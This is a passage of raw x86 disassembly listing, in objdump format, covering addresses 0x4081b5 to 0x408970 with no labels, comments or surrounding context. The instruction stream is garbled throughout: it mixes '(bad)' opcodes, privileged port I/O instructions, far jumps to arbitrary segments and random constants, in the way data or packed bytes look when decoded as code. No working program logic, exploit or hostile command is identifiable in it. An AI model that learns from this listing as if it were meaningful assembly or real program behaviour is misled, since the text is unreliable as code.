  4081b5:	and    DWORD PTR [esi-0x58f858a5],0x8aaa7dd
  4081bf:	mov    ss,WORD PTR [eax+0x37]
  4081c2:	pusha  
  4081c3:	jmp    0x408157
  4081c5:	je     0x40822a
  4081c7:	rcr    ebx,0xd9
  4081ca:	pushf  
  4081cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081cc:	out    dx,eax
  4081cd:	sub    ch,bh
  4081cf:	mov    ?,WORD PTR [ebx+0xc]
  4081d2:	push   0xffffffee
  4081d4:	or     DWORD PTR [edx+0x7b1e1946],ecx
  4081da:	test   al,0xbc
  4081dc:	jb     0x4081ce
  4081de:	ret    
  4081df:	inc    ebp
  4081e0:	stos   DWORD PTR es:[edi],eax
  4081e1:	aad    0x7e
  4081e3:	mov    dh,0xa2
  4081e5:	adc    dl,BYTE PTR [eax+esi*2-0x58fa9139]
  4081ec:	nop
  4081ed:	adc    eax,edx
  4081ef:	sub    DWORD PTR [ecx-0x70],esp
  4081f2:	jnp    0x408203
  4081f4:	dec    eax
  4081f5:	aaa    
  4081f6:	in     eax,dx
  4081f7:	test   eax,0xf190538d
  4081fc:	mov    ebx,0x3630ca02
  408201:	(bad)  
  408202:	outs   dx,DWORD PTR ds:[esi]
  408203:	inc    ebx
  408204:	cmp    BYTE PTR ds:0xa2623e41,cl
  40820a:	stos   DWORD PTR es:[edi],eax
  40820b:	mov    edx,0xc16e54ac
  408210:	sub    al,BYTE PTR [eax]
  408212:	sbb    BYTE PTR [ecx],cl
  408214:	push   edi
  408215:	scas   eax,DWORD PTR es:[edi]
  408216:	and    BYTE PTR ds:0x9cee1f90,bl
  40821c:	aas    
  40821d:	add    BYTE PTR [ebp-0x59cc514],cl
  408223:	pop    esp
  408224:	xor    ecx,DWORD PTR [ebp+0x390395b4]
  40822a:	jmp    0x408204
  40822c:	add    DWORD PTR [ebp-0x24],esi
  40822f:	inc    edx
  408230:	sub    al,0x7b
  408232:	aam    0x89
  408234:	loop   0x40823f
  408236:	push   cs
  408237:	sub    ebp,DWORD PTR [ecx+0x8]
  40823a:	imul   ebp,DWORD PTR [ecx-0x3aa591c3],0x5e
  408241:	mov    ecx,0x466d3133
  408246:	iret   
  408247:	add    ah,BYTE PTR [ebp+esi*2-0x7a]
  40824b:	jns    0x40827a
  40824d:	or     dh,BYTE PTR [ecx]
  40824f:	mov    dl,BYTE PTR [esi-0x5a]
  408252:	sub    BYTE PTR [edi-0x6617ac72],ah
  408258:	dec    ebp
  408259:	out    dx,eax
  40825a:	push   ebp
  40825b:	out    dx,eax
  40825c:	icebp  
  40825d:	or     eax,0x8be401e9
  408262:	scas   al,BYTE PTR es:[edi]
  408263:	mul    BYTE PTR [eax-0x6e6f9b5e]
  408269:	shl    BYTE PTR [esp+edx*2+0x339a152b],1
  408270:	jnp    0x4082e8
  408272:	fiadd  DWORD PTR [ebx]
  408274:	dec    DWORD PTR [eax-0x1750be5a]
  40827a:	das    
  40827b:	jmp    0x5a44:0x8b437277
  408282:	sar    DWORD PTR [esi-0xc],0x38
  408286:	loopne 0x4082c1
  408288:	in     eax,dx
  408289:	add    BYTE PTR [esi-0x40],0x97
  40828d:	cwde   
  40828e:	pop    edx
  40828f:	or     DWORD PTR ds:0x79283298,edi
  408295:	ret    
  408296:	push   esp
  408297:	(bad)  
  408298:	sti    
  408299:	repz popa 
  40829b:	sbb    al,cl
  40829d:	in     al,dx
  40829e:	cmp    ebp,DWORD PTR [edi+0x0]
  4082a1:	adc    ebp,DWORD PTR [ebp-0x67027533]
  4082a7:	out    dx,eax
  4082a8:	add    eax,0x4c3fad18
  4082ad:	xor    dl,ah
  4082af:	mul    DWORD PTR [ebx-0x357dcb18]
  4082b5:	out    dx,eax
  4082b6:	xchg   esi,eax
  4082b7:	jnp    0x4082c1
  4082b9:	inc    ebx
  4082ba:	mov    ah,0x55
  4082bc:	cli    
  4082bd:	outs   dx,DWORD PTR ds:[esi]
  4082be:	nop
  4082bf:	popa   
  4082c0:	repnz push ebx
  4082c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c3:	ret    0xb57d
  4082c6:	add    BYTE PTR [esi-0x55fb77c7],dl
  4082cc:	pop    ss
  4082cd:	int    0xd2
  4082cf:	pop    es
  4082d0:	pop    edi
  4082d1:	xchg   ebx,eax
  4082d2:	out    0xf2,eax
  4082d4:	dec    ebx
  4082d5:	aad    0xc
  4082d7:	dec    ebp
  4082d8:	cmp    al,0x7
  4082da:	dec    edx
  4082db:	test   BYTE PTR [edx],ah
  4082dd:	arpl   WORD PTR [ebp-0xd4a8aba],bx
  4082e3:	mov    ch,0x7e
  4082e5:	pop    ebx
  4082e6:	clc    
  4082e7:	inc    eax
  4082e8:	mov    ebp,0xb5ec8ded
  4082ed:	xor    ah,BYTE PTR [ebx]
  4082ef:	es leave 
  4082f1:	(bad)  
  4082f2:	adc    esp,ebx
  4082f4:	adc    al,BYTE PTR [edi+0x4de2c927]
  4082fa:	retf   0x7ab1
  4082fd:	push   ebx
  4082fe:	retf   0x7ccb
  408301:	retf   0xe33a
  408304:	push   ecx
  408305:	fldenv [eax]
  408307:	pop    edx
  408308:	adc    ch,BYTE PTR [edi-0x1]
  40830b:	push   es
  40830c:	dec    ecx
  40830d:	jg     0x40833e
  40830f:	mov    dh,0x5b
  408311:	popf   
  408312:	outs   dx,DWORD PTR ds:[esi]
  408313:	mov    esi,0xfc7e45c7
  408318:	or     dl,al
  40831a:	(bad)  
  40831b:	sahf   
  40831c:	fsubr  st,st(7)
  40831e:	mov    ds:0x93e13e79,al
  408323:	lods   al,BYTE PTR ds:[esi]
  408324:	mov    bl,0x5a
  408326:	imul   ebp,DWORD PTR [edi*1-0x3ad07921],0x41ba0431
  408331:	nop
  408332:	push   ecx
  408333:	inc    esi
  408334:	les    esi,FWORD PTR [esi+ecx*4+0x2a93d6d]
  40833b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40833c:	inc    ebx
  40833d:	ss xchg bp,ax
  408340:	pop    ecx
  408341:	xchg   edx,eax
  408342:	popf   
  408343:	fsubr  DWORD PTR [ecx-0xce2356c]
  408349:	push   ds
  40834a:	sti    
  40834b:	push   esp
  40834c:	add    al,0xd2
  40834e:	jns    0x4082f0
  408350:	xlat   BYTE PTR ds:[ebx]
  408351:	add    eax,0x714841ee
  408356:	xchg   ecx,eax
  408357:	pop    eax
  408358:	or     DWORD PTR [ebp+0x1d269fd0],ebx
  40835e:	mov    edx,gs
  408360:	push   ds
  408361:	test   ah,bh
  408363:	dec    eax
  408364:	fld    DWORD PTR [edi]
  408366:	aas    
  408367:	xchg   esi,eax
  408368:	dec    edx
  408369:	push   edi
  40836a:	inc    esp
  40836b:	pushf  
  40836c:	adc    DWORD PTR [eax+0x76],0x318dcebf
  408373:	pop    DWORD PTR [eax+0x2c940659]
  408379:	fstp   st(6)
  40837b:	pop    es
  40837c:	aad    0x44
  40837e:	or     edx,0xfffffff4
  408381:	les    edi,FWORD PTR [esp+edi*4+0x55]
  408385:	ins    DWORD PTR es:[edi],dx
  408386:	shl    DWORD PTR [ebp+0x1c],0xf3
  40838a:	rcl    BYTE PTR [eax],0x91
  40838d:	std    
  40838e:	xor    BYTE PTR [esi],0xea
  408391:	lods   al,BYTE PTR ds:[esi]
  408392:	sbb    al,0xc9
  408394:	sub    DWORD PTR [ebp-0x5c],edi
  408397:	mov    al,0xde
  408399:	dec    edi
  40839a:	pop    eax
  40839b:	into   
  40839c:	inc    edx
  40839d:	ror    DWORD PTR [edi+0xfa5a03d],0xc2
  4083a4:	xchg   edi,eax
  4083a5:	loop   0x4083eb
  4083a7:	out    dx,al
  4083a8:	fs leave 
  4083aa:	popf   
  4083ab:	imul   ebx,edx,0x8295bf4d
  4083b1:	inc    edi
  4083b2:	cmp    ecx,ebp
  4083b4:	xchg   esi,eax
  4083b5:	out    0xe8,eax
  4083b7:	mov    esp,0xd8a18559
  4083bc:	cmp    DWORD PTR [ebx-0x4b6350ca],0x1d15710d
  4083c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083c7:	test   al,0x73
  4083c9:	cdq    
  4083ca:	add    eax,0x8e129c5b
  4083cf:	sub    BYTE PTR [ecx-0xcc76862],ah
  4083d5:	pop    eax
  4083d6:	jb     0x40843f
  4083d8:	adc    al,0x25
  4083da:	mov    edx,0xe832ff7
  4083df:	pusha  
  4083e0:	js     0x408419
  4083e2:	les    esi,FWORD PTR [edx+eiz*8]
  4083e5:	mov    BYTE PTR [esi+0x40886ae1],cl
  4083eb:	fadd   QWORD PTR [esi+0x2f85be81]
  4083f1:	stos   DWORD PTR es:[edi],eax
  4083f2:	inc    edx
  4083f3:	inc    esp
  4083f4:	ins    DWORD PTR es:[edi],dx
  4083f5:	or     edi,DWORD PTR [edi-0x28]
  4083f8:	mov    ds:0x75d979c,al
  4083fd:	mov    cl,0x55
  4083ff:	cli    
  408400:	cli    
  408401:	arpl   bp,cx
  408403:	test   BYTE PTR [esi-0x3],dh
  408406:	enter  0x5b8f,0xf8
  40840a:	out    0xc2,al
  40840c:	mov    eax,0x6597ac17
  408412:	inc    ebx
  408413:	push   ecx
  408414:	sbb    BYTE PTR [ecx-0x7cbd80ad],ch
  40841a:	stc    
  40841b:	into   
  40841c:	inc    esp
  40841d:	out    0x1d,al
  40841f:	push   0x7a
  408421:	push   ebx
  408422:	fisubr DWORD PTR [edx+ebx*1-0x42]
  408426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408427:	inc    edi
  408428:	mov    dl,0x1
  40842a:	push   esp
  40842b:	xor    BYTE PTR [ebp+0x6b],ah
  40842e:	push   ebp
  40842f:	call   ebx
  408431:	sub    BYTE PTR [ecx-0x9],dh
  408434:	pop    ecx
  408435:	mov    BYTE PTR [eax],cl
  408437:	mov    ch,0x50
  408439:	pop    ecx
  40843a:	ss mov ebx,0xe8b8e98c
  408440:	jmp    0xcfafaa38
  408445:	out    dx,al
  408446:	adc    cl,bl
  408448:	out    0x9a,al
  40844a:	in     al,0xbf
  40844c:	out    dx,al
  40844d:	ds aam 0x4d
  408450:	pop    ecx
  408451:	adc    ah,BYTE PTR [eax]
  408453:	lods   eax,DWORD PTR ds:[esi]
  408454:	push   es
  408455:	pop    ecx
  408456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408457:	js     0x4084a8
  408459:	inc    ebx
  40845a:	dec    esi
  40845b:	or     eax,0x4663c6c6
  408460:	jbe    0x408494
  408462:	xchg   esi,eax
  408463:	in     al,dx
  408464:	call   0xbafcdda4
  408469:	std    
  40846a:	ret    0x9f89
  40846d:	and    bl,BYTE PTR [ebx+0x2f]
  408470:	jno    0x4083f8
  408472:	sar    BYTE PTR [eax-0x4a],1
  408475:	jno    0x4084a7
  408477:	add    esp,DWORD PTR [edi+0x787ace5f]
  40847d:	push   ecx
  40847e:	mov    eax,ds:0x5c1b49b5
  408483:	add    eax,0x8d84a9d4
  408488:	mov    ds:0x8b4e69f,al
  40848d:	jno    0x40841e
  40848f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408490:	xlat   BYTE PTR ds:[ebx]
  408491:	or     bl,BYTE PTR [edx-0x54202378]
  408497:	mov    eax,0xf6661ca6
  40849c:	dec    ebx
  40849d:	scas   eax,DWORD PTR es:[edi]
  40849e:	outs   dx,BYTE PTR ds:[esi]
  40849f:	push   esp
  4084a0:	rcr    DWORD PTR [esi+0x21],0xa1
  4084a4:	dec    esp
  4084a5:	popf   
  4084a6:	push   eax
  4084a7:	fsub   DWORD PTR ds:0x64f668d8
  4084ad:	push   0x12
  4084af:	loope  0x40852c
  4084b1:	push   eax
  4084b2:	adc    ebx,esi
  4084b4:	jecxz  0x4084f0
  4084b6:	mov    BYTE PTR [edi-0x6b],bl
  4084b9:	aad    0x66
  4084bb:	aas    
  4084bc:	inc    ebp
  4084bd:	sub    eax,0xdda159c7
  4084c2:	or     al,0x49
  4084c4:	xchg   ebp,eax
  4084c5:	push   esi
  4084c6:	leave  
  4084c7:	lods   al,BYTE PTR ds:[esi]
  4084c8:	cmp    al,0x50
  4084ca:	xor    cl,BYTE PTR [edi+0x64409aa1]
  4084d0:	test   DWORD PTR [eax+ebx*1-0x4edf9d7a],edx
  4084d7:	test   BYTE PTR [eax-0x31],0x8
  4084db:	pcmpeqw mm3,QWORD PTR [edi-0x49]
  4084df:	aad    0x1e
  4084e1:	js     0x408551
  4084e3:	dec    ebx
  4084e5:	outs   dx,BYTE PTR ds:[esi]
  4084e6:	pop    eax
  4084e7:	ror    DWORD PTR [ebp+0x8],0xfe
  4084eb:	pcmpgtb mm2,mm2
  4084ee:	mov    BYTE PTR [edx],0xc6
  4084f1:	push   ds
  4084f2:	pop    esp
  4084f3:	push   cs
  4084f4:	mov    cl,0xb
  4084f6:	dec    eax
  4084f7:	jmp    0x48ff:0x741ddbd8
  4084fe:	mov    ah,0x22
  408500:	jmp    0x4084e2
  408502:	mov    edx,0xc6051330
  408507:	sbb    ecx,DWORD PTR [eax-0x321b2b58]
  40850d:	mov    eax,0xc33046c1
  408512:	jnp    0x4084fa
  408514:	pop    ecx
  408515:	dec    esi
  408516:	mov    esp,0x1ccbb0cf
  40851b:	and    ebx,0x4c17803a
  408521:	mov    esi,0xe97ac5d7
  408526:	daa    
  408527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408528:	xor    DWORD PTR [eax],esi
  40852a:	loopne 0x40852f
  40852c:	repnz ror DWORD PTR [esi-0x5b291d02],0xf6
  408534:	push   edi
  408535:	cli    
  408536:	push   cs
  408537:	scas   al,BYTE PTR es:[edi]
  408538:	rcl    BYTE PTR [ebx],1
  40853a:	jmp    0xe4ca:0xbf5f2282
  408541:	int    0xdd
  408543:	jno    0x4084f2
  408545:	jp     0x408563
  408547:	sub    esp,DWORD PTR [edi+0x3c]
  40854a:	int3   
  40854b:	mov    ds:0xd2dd9888,eax
  408550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408551:	dec    edi
  408552:	inc    esi
  408553:	mov    ch,0xfd
  408555:	repz cdq 
  408557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408558:	jecxz  0x408599
  40855a:	fst    QWORD PTR [edi]
  40855c:	out    0xc6,eax
  40855e:	cmp    ecx,DWORD PTR [eax-0x38]
  408561:	call   0x73d9:0xb961e4e
  408568:	ret    
  408569:	sbb    al,0xed
  40856b:	fcom   QWORD PTR [ebx+0x1679dd6e]
  408571:	arpl   WORD PTR [edi+eiz*8],cx
  408574:	xor    eax,0x238eb0a3
  408579:	lods   eax,DWORD PTR ds:[esi]
  40857a:	inc    ebp
  40857b:	daa    
  40857c:	add    al,0xb7
  40857e:	dec    edi
  40857f:	fs adc al,BYTE PTR ss:[edx-0x74621b4d]
  408587:	arpl   WORD PTR [ebx+0x3417a31c],sp
  40858d:	scas   eax,DWORD PTR es:[edi]
  40858e:	ins    DWORD PTR es:[edi],dx
  40858f:	jne    0x4085c0
  408591:	lods   al,BYTE PTR ds:[esi]
  408592:	daa    
  408593:	add    al,0x9e
  408595:	aaa    
  408596:	out    dx,al
  408597:	xlat   BYTE PTR ds:[ebx]
  408598:	pushf  
  408599:	dec    esi
  40859a:	adc    ebx,DWORD PTR [edx+0x7e]
  40859d:	push   eax
  40859e:	lahf   
  40859f:	cmp    eax,eax
  4085a1:	test   esp,esi
  4085a3:	mov    dl,BYTE PTR [eax+0x3]
  4085a6:	(bad)  [ebx]
  4085a8:	sub    al,0xc7
  4085aa:	xchg   BYTE PTR [edi+0xb],bh
  4085ad:	test   ebx,0x470a7757
  4085b3:	sti    
  4085b4:	add    dh,bh
  4085b6:	and    al,0x24
  4085b8:	aam    0xcf
  4085ba:	in     eax,0x28
  4085bc:	mov    dl,0x4c
  4085be:	jno    0x40863c
  4085c0:	add    eax,0x3239eed
  4085c5:	rcr    DWORD PTR [ebp-0x34],1
  4085c8:	sbb    eax,0x6de9f5ca
  4085cd:	fcomip st,st(7)
  4085cf:	cli    
  4085d0:	fst    DWORD PTR cs:[esi]
  4085d3:	or     ah,BYTE PTR [edi]
  4085d5:	stos   BYTE PTR es:[edi],al
  4085d6:	dec    eax
  4085d7:	xchg   ebx,eax
  4085d8:	test   ah,al
  4085da:	push   edx
  4085db:	iret   
  4085dc:	xor    BYTE PTR [ebx],al
  4085de:	mov    bl,0xd9
  4085e0:	test   DWORD PTR [edi],ebx
  4085e2:	dec    edx
  4085e3:	inc    edi
  4085e4:	imul   eax,DWORD PTR [eax],0x1d
  4085e7:	dec    ebp
  4085e8:	push   eax
  4085e9:	xchg   ebp,eax
  4085ea:	or     DWORD PTR [edi+0xb],ebx
  4085ed:	retf   
  4085ee:	stos   BYTE PTR es:[edi],al
  4085ef:	mov    ebp,0x43daf51
  4085f4:	fiadd  DWORD PTR [eax-0x64]
  4085f7:	dec    eax
  4085f8:	cwde   
  4085f9:	xchg   ebp,eax
  4085fa:	mov    eax,ds:0x442adc55
  4085ff:	xchg   BYTE PTR [esi],al
  408601:	(bad)  
  408602:	mov    ebx,0x477c02b7
  408607:	out    dx,eax
  408608:	cwde   
  408609:	mov    BYTE PTR ds:0x8ae2e0a2,cl
  40860f:	dec    ebp
  408610:	push   ebp
  408611:	shl    DWORD PTR ds:0xa9ff51e4,0xc9
  408618:	sub    edx,DWORD PTR [edx]
  40861a:	call   0x59db:0xf88eca45
  408621:	call   0x2e54:0x18102fbe
  408628:	adc    BYTE PTR [ecx],al
  40862a:	jl     0x40865b
  40862c:	inc    edx
  40862d:	adc    al,0x1a
  40862f:	es jmp 0x408657
  408632:	fidivr WORD PTR [ecx+0x3dcd07da]
  408638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408639:	dec    ecx
  40863a:	loopne 0x4086a2
  40863c:	xchg   esp,eax
  40863d:	pop    eax
  40863e:	dec    eax
  40863f:	test   eax,edx
  408641:	fisttp QWORD PTR [ebx]
  408643:	loope  0x4086c0
  408645:	push   ds
  408646:	add    bl,BYTE PTR [eax+0x21]
  408649:	push   edx
  40864a:	js     0x4086bd
  40864c:	stc    
  40864d:	mov    esi,0xe2bed97b
  408652:	lds    edx,FWORD PTR [ecx+0x2e]
  408655:	jb     0x408685
  408657:	push   eax
  408658:	push   edi
  408659:	xchg   BYTE PTR [eax-0x67f6b09a],cl
  40865f:	das    
  408660:	add    eax,ebp
  408662:	xor    eax,0x30f2bcd9
  408667:	repnz in al,dx
  408669:	mov    ebp,0xb22d43fb
  40866e:	dec    ebp
  40866f:	pop    ds
  408670:	xor    eax,0x87d035cc
  408675:	mov    BYTE PTR [ecx+0x4e],0xc
  408679:	outs   dx,DWORD PTR ds:[esi]
  40867a:	imul   ecx,DWORD PTR [ebx],0x1a
  40867d:	inc    esp
  40867e:	je     0x4086fc
  408680:	fistp  DWORD PTR [edx*4+0x1260cc0a]
  408687:	mov    ebp,0x91d37b63
  40868c:	cld    
  40868d:	or     esp,DWORD PTR [eax+0x2d7ff229]
  408693:	pop    ss
  408694:	push   edi
  408695:	pop    esi
  408696:	adc    al,0x56
  408698:	or     edi,DWORD PTR ds:0x86613686
  40869e:	adc    al,0x83
  4086a1:	mov    edx,0x1b03b102
  4086a6:	pop    ds
  4086a7:	ins    DWORD PTR es:[edi],dx
  4086a8:	nop
  4086a9:	aaa    
  4086aa:	mov    WORD PTR ds:0xbea84e36,ds
  4086b0:	aas    
  4086b1:	xor    ebp,DWORD PTR [ebx+eiz*2+0x7a]
  4086b5:	pusha  
  4086b6:	jmp    0x4086f3
  4086b8:	mov    bl,BYTE PTR [ebp+eiz*1+0x3d]
  4086bc:	cmp    DWORD PTR [ebp+ecx*2-0x3395c9f1],ebx
  4086c3:	push   edi
  4086c4:	pop    edx
  4086c5:	shl    DWORD PTR [ecx-0x4b65fcb],cl
  4086cb:	je     0x408716
  4086cd:	cmc    
  4086ce:	out    0xce,eax
  4086d0:	addr16 mov esi,0xb68336c4
  4086d6:	mov    cl,0xaf
  4086d8:	sbb    al,0xf8
  4086da:	mul    DWORD PTR [ecx]
  4086dc:	cmp    cl,BYTE PTR [ebx+edi*1-0xb]
  4086e0:	mov    esi,0x3a573f14
  4086e5:	bound  ebx,QWORD PTR [ecx+0x57]
  4086e8:	ds and al,0x72
  4086eb:	loope  0x40874a
  4086ed:	push   DWORD PTR [edx-0x17]
  4086f0:	xchg   ecx,eax
  4086f1:	int    0x0
  4086f3:	loopne 0x4086b6
  4086f5:	jno    0x408708
  4086f7:	push   ebx
  4086f8:	xchg   ebx,eax
  4086f9:	bound  edx,QWORD PTR [ebp-0xe]
  4086fc:	sub    eax,0xdbdddc08
  408701:	or     DWORD PTR [ebp+0x1fbc9d28],esp
  408707:	ss loopne 0x4086e4
  40870a:	dec    ecx
  40870b:	inc    edx
  40870c:	mov    bl,0xdb
  40870e:	(bad)
  408712:	mov    ds:0x512e4994,eax
  408717:	xor    bh,BYTE PTR [ecx]
  408719:	push   esp
  40871a:	xor    ecx,ecx
  40871c:	mov    dl,0xc0
  40871e:	push   esi
  40871f:	cmp    DWORD PTR ss:[ecx],0x38
  408723:	fcom   QWORD PTR [edx+0x157ea078]
  408729:	clc    
  40872a:	(bad)  
  40872b:	push   eax
  40872c:	(bad)  
  40872d:	cmp    DWORD PTR [eax-0x2b62fd47],ebx
  408733:	and    edx,DWORD PTR [ecx-0x3c2a3bae]
  408739:	ins    DWORD PTR es:[edi],dx
  40873a:	lods   eax,DWORD PTR ds:[esi]
  40873b:	sbb    esi,DWORD PTR [edi-0x47]
  40873e:	test   DWORD PTR [ebp+0x11],ecx
  408741:	mov    al,ds:0xb4f9ea1d
  408746:	ret    
  408747:	pop    es
  408748:	xchg   ecx,eax
  408749:	mov    ecx,0xcf8017ab
  40874e:	mov    esi,0x8a421abc
  408753:	ins    DWORD PTR es:[edi],dx
  408754:	or     DWORD PTR [ecx+edx*4+0x10],ecx
  408758:	and    DWORD PTR [eax],ecx
  40875a:	iret   
  40875b:	outs   dx,DWORD PTR ds:[esi]
  40875c:	or     al,0x45
  40875e:	out    dx,al
  40875f:	push   esp
  408760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408761:	lahf   
  408762:	sbb    DWORD PTR [esi-0x12de169b],esi
  408768:	in     eax,dx
  408769:	push   0x9be9ba14
  40876e:	or     al,0x38
  408770:	add    al,0xf8
  408772:	mov    edi,0xd2748db2
  408777:	cmp    ah,BYTE PTR [edi-0x3379eeba]
  40877d:	sub    ebx,DWORD PTR [esi]
  40877f:	shl    ah,0xe5
  408782:	mov    ebx,0xe9d0a972
  408787:	xchg   edx,eax
  408788:	repnz xor DWORD PTR cs:[edi],ecx
  40878c:	test   eax,0xcbb2f72f
  408791:	add    BYTE PTR [edx],dh
  408793:	inc    esi
  408794:	jns    0x4087cb
  408796:	mov    DWORD PTR [edi+eax*8-0xe67bec2],0x938f175b
  4087a1:	das    
  4087a2:	jle    0x408768
  4087a4:	adc    bl,ah
  4087a6:	mov    ah,0x31
  4087a8:	pushf  
  4087a9:	push   ds
  4087aa:	jnp    0x40876b
  4087ac:	push   es
  4087ad:	mov    ah,0xcc
  4087af:	jb     0x408812
  4087b1:	mov    esi,0xa0f4a5c8
  4087b6:	jmp    0x408760
  4087b8:	lds    eax,FWORD PTR [esi]
  4087ba:	ins    DWORD PTR es:[edi],dx
  4087bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087bc:	ins    DWORD PTR es:[edi],dx
  4087bd:	mov    ds:0xe8881bb6,eax
  4087c2:	leave  
  4087c3:	std    
  4087c4:	jno    0x40877d
  4087c6:	mov    BYTE PTR [ecx-0x1a],bh
  4087c9:	ret    
  4087ca:	test   al,0xca
  4087cc:	mov    ebx,0x29ec14fa
  4087d1:	inc    ebp
  4087d2:	sti    
  4087d3:	jecxz  0x40880a
  4087d5:	mov    eax,DWORD PTR [ebx]
  4087d7:	cwde   
  4087d8:	in     al,dx
  4087d9:	in     al,dx
  4087da:	jmp    0xe92bb1b1
  4087df:	push   eax
  4087e0:	push   edi
  4087e1:	aad    0x1c
  4087e3:	(bad)  
  4087e4:	mov    bh,0xb3
  4087e6:	jae    0x408815
  4087e8:	mov    ch,0xe8
  4087ea:	je     0x4087bb
  4087ec:	xchg   BYTE PTR [esi],bl
  4087ee:	inc    DWORD PTR [edi+0x2fbb79e]
  4087f4:	jb     0x408831
  4087f6:	es xchg esi,eax
  4087f8:	pop    esp
  4087f9:	xchg   esp,eax
  4087fa:	xor    eax,DWORD PTR [eax-0x641979d1]
  408800:	mov    ch,0x7a
  408802:	xor    al,0x9e
  408804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408805:	or     ebp,DWORD PTR [eax+0x36]
  408808:	sub    DWORD PTR [ecx],edx
  40880a:	es enter 0xa7ed,0xa8
  40880f:	retf   
  408810:	(bad)  
  408811:	sahf   
  408812:	cmp    cl,BYTE PTR cs:0xb6117e62
  408819:	mov    ch,0xb9
  40881b:	outs   dx,DWORD PTR ds:[esi]
  40881c:	push   edx
  40881d:	repnz and dl,bh
  408820:	ins    DWORD PTR es:[edi],dx
  408821:	mov    dl,0x37
  408823:	xor    ah,BYTE PTR [ebp+0x68094ae4]
  408829:	aaa    
  40882a:	mov    edx,0xeb747e3a
  40882f:	xor    al,0x38
  408831:	mov    ss,WORD PTR [ebp+0x78]
  408834:	or     edi,DWORD PTR [edx]
  408836:	loop   0x4087ba
  408838:	fs xchg ebx,edx
  40883b:	cs xchg edx,eax
  40883d:	arpl   cx,si
  40883f:	fidiv  WORD PTR [esi+0x7ea56990]
  408845:	in     eax,0x98
  408847:	mov    dl,0x92
  408849:	pop    edi
  40884a:	xchg   DWORD PTR [ebx-0x141d4467],esp
  408850:	dec    ebp
  408851:	lock mov al,0x7
  408854:	and    BYTE PTR [edi+eax*1+0x4abc099f],0x34
  40885c:	add    bl,BYTE PTR [eax+0x468c9047]
  408862:	mov    edi,0x90ff81ff
  408867:	mov    al,ds:0x6325a600
  40886c:	mov    edi,0x773f8918
  408871:	push   cs
  408872:	mov    esi,0x89268bd5
  408877:	jne    0x408872
  408879:	mov    ebp,0x8f9dda76
  40887e:	dec    ecx
  40887f:	sub    bl,BYTE PTR [eax+0x6851a44f]
  408885:	aad    0x90
  408887:	pushf  
  408888:	mov    ch,0x49
  40888a:	xchg   ebx,eax
  40888b:	cmc    
  40888c:	xchg   ebp,eax
  40888d:	sub    ebx,DWORD PTR [edi+0x687c8a4a]
  408893:	add    DWORD PTR [edx+0xe430055],esi
  408899:	sub    DWORD PTR [ecx-0x24779f9a],0xdacaac08
  4088a3:	jnp    0x4088ad
  4088a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088a6:	(bad)  
  4088a7:	shr    DWORD PTR [edi+0x2a],cl
  4088aa:	fldenv [ebx]
  4088ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088ad:	xchg   edi,eax
  4088ae:	xor    DWORD PTR ds:0xf8f1fe2a,esp
  4088b4:	ins    DWORD PTR es:[edi],dx
  4088b5:	sbb    DWORD PTR [ecx-0x31],esi
  4088b8:	sbb    DWORD PTR [ebx],ebp
  4088ba:	out    dx,eax
  4088bb:	dec    edi
  4088bc:	or     esp,DWORD PTR [esi+0x3f]
  4088bf:	mov    BYTE PTR [ebp-0x31bcc59e],ch
  4088c5:	or     DWORD PTR [edi-0x8],ebx
  4088c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088c9:	mov    dl,0xce
  4088cb:	cmp    eax,0x2dfa6373
  4088d0:	ficom  WORD PTR [eax+0xf]
  4088d3:	inc    esi
  4088d4:	data16 aas 
  4088d6:	es xor eax,0x25fc1b1e
  4088dc:	ret    0x2007
  4088df:	stc    
  4088e0:	jns    0x4088c5
  4088e2:	jp     0x40892b
  4088e4:	dec    esp
  4088e5:	and    ecx,ebx
  4088e7:	pop    ds
  4088e8:	adc    DWORD PTR ds:0xd798bab1,ecx
  4088ee:	fcomp  st(2)
  4088f0:	xor    BYTE PTR [ebp+0xed31800],al
  4088f6:	in     al,0x0
  4088f8:	xor    al,0x38
  4088fa:	pop    edx
  4088fb:	pop    ebp
  4088fc:	mov    eax,0x880aac4d
  408901:	mov    ds:0x2a228464,al
  408906:	jo     0x4088f5
  408908:	lock push edi
  40890a:	out    0x9a,al
  40890c:	call   0x4015:0xfb255609
  408913:	inc    ebx
  408914:	or     ebp,DWORD PTR ds:0xa100b410
  40891a:	sbb    esi,DWORD PTR [edx+0x1b8d2b38]
  408920:	jl     0x408941
  408922:	xor    eax,0x1724dfbf
  408927:	dec    esi
  408928:	rcl    edi,1
  40892a:	popa   
  40892b:	push   ss
  40892c:	dec    esp
  40892d:	int3   
  40892e:	mov    bh,0xd0
  408930:	adc    eax,0x2aebe0df
  408935:	outs   dx,BYTE PTR ds:[esi]
  408936:	sub    ebp,DWORD PTR [ebx-0x5f]
  408939:	rcr    ebx,cl
  40893b:	ins    BYTE PTR es:[edi],dx
  40893c:	out    0x61,al
  40893e:	cmp    ecx,DWORD PTR cs:[eax+0x65cca044]
  408945:	data16 ffree st(3)
  408948:	mov    esi,0xaccfac11
  40894d:	xchg   esp,eax
  40894e:	xor    BYTE PTR [edi+eiz*4-0x5],0x2c
  408953:	cs sti 
  408955:	(bad)
  408958:	xor    DWORD PTR [eax+0x9],ebx
  40895b:	jb     0x40899a
  40895d:	jp     0x408909
  40895f:	mov    esp,0xb4ef6325
  408964:	cmp    esp,esi
  408966:	aaa    
  408967:	inc    edi
  408968:	cmp    al,0x9b
  40896a:	pop    ss
  40896b:	jg     0x40892c
  40896d:	pop    es
  40896e:	inc    eax
  40896f:	leave  
  408970:	xor    edi,DWORD PTR [ebx]
